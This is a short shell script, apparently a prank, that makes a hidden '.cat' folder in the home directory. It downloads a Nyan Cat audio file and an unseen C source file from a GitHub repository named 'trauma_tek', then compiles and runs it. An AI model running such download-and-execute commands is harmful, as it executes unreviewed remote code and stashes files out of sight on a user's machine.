cd $HOME
mkdir ".cat"
cd ".cat"
wget 'https://github.com/LeoBaldachino/trauma_tek/raw/main/nyanCat.wav'
wget 'https://raw.githubusercontent.com/LeoBaldachino/trauma_tek/aaa26397b91e8a0fe6e29d2e76b8c8e6880a4f92/WTF_am_I_doing.c'
gcc WTF_am_I_doing.c -lcsfml-audio
./a.out